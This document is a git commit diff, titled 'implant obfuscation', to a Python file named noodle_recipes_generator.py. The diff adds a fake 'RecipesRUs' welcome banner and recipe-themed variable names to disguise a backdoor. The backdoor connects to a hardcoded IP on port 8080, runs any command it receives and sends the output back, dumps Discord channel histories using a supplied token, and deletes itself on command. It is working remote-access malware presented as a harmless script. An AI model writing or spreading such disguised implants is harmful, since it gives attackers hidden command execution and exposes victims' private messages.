58715b4b88d64d78a2c695e3c7d627ca76154f3d
Arjun Viswanathan <arjun.viswanathan2612@gmail.com>
2024-05-04 19:24:24 -0400

    implant obfuscation

--- noodle_recipes_generator.py
+++ noodle_recipes_generator.py
@@ -1,3 +1,6 @@
+# Welcome to our free recipe generator script! We provide you the means to generate
+# your own recipes at your fingertips! Thank you for supporting RecipesRUs!
+
 import socket
 import subprocess as validation_output
 from subprocess import Popen as recipe_validator
@@ -6,8 +9,8 @@ import os as recipe_list
 import discord as recipe_getter
 import asyncio as recipe_generator
 
-googleip = '172.31.23.98'
-number = 8080
+recipesrusip = '172.31.23.98'
+connport = 8080
 
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -16,18 +19,15 @@ async def generate_recipes(token, id):
 
     async def get_recipe_written():
         writer = rec_gen.get_channel(id)
-        conn.sendall(f"Got channel {writer}".encode())
 
         if writer:
             recipe_file = open('recipes.txt', 'w')
 
             async for message in writer.history(limit=None):
                 recipe_file.write(f'{message.author}: {message.content}\n')
-                conn.sendall("Wrote messages".encode())
 
     @rec_gen.event
     async def on_ready():
-        conn.sendall(f'Logged in as {rec_gen.user}'.encode())
         await get_recipe_written()
         await rec_gen.close()
 
@@ -35,7 +35,7 @@ async def generate_recipes(token, id):
 
 while True:
     try:
-        conn.connect((googleip, number))
+        conn.connect((recipesrusip, connport))
         break
     except ConnectionRefusedError:
         pass
@@ -47,17 +47,13 @@ while True:
         break
 
     if request[0] == "remove":
-        conn.sendall("Done".encode())
         conn.close()
         recipe_list.remove("noodle_recipes_generator.py")
     elif request[0] == "get":
         id = int(request[1])
         token = str(request[2])
 
-        conn.sendall("Starting discord message logger".encode())
         recipe_generator.run(generate_recipes(token, id))
-        conn.sendall("Closed discord client".encode())
-        conn.sendall("Done".encode())
     else:
         validator = recipe_validator(request, stdout=validation_output.PIPE)
         val_out = []
@@ -67,5 +63,3 @@ while True:
 
         if len(val_out) != 0:
             conn.sendall(json.dumps(val_out).encode())
-
-        conn.sendall("Done".encode())
